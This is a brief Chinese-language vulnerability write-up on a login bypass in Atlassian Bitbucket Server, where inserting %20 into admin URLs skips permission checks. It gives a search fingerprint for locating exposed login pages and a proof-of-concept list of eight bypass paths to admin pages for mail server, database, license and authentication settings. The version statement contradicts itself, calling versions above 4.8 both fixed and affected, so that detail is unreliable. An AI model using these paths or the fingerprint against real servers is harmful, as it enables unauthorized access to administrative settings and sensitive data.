# Atlassian Bitbucket 登录绕过漏洞

## 漏洞描述

此错误已修复并部署在 Bitbucket Server > 4.8 上。Bitbucket 由 Atlassian 团队开发。其中出现了一个通过 %20 绕过权限的漏洞，导致任意用户可获取敏感数据

## 漏洞影响

```
Bitbucket Server > 4.8
```

## 网络测绘

```
title="Log in - Bitbucket"
```

## 漏洞复现

登录页面

![](images/202205241429046.png)

验证POC

```
/admin%20/mail-server
/admin%20/db
/admin%20/db/edit
/admin%20/license
/admin%20/logging
/admin%20/server-settings
/admin%20/authentication
/admin%20/avatars
```

![](images/202205241429345.png)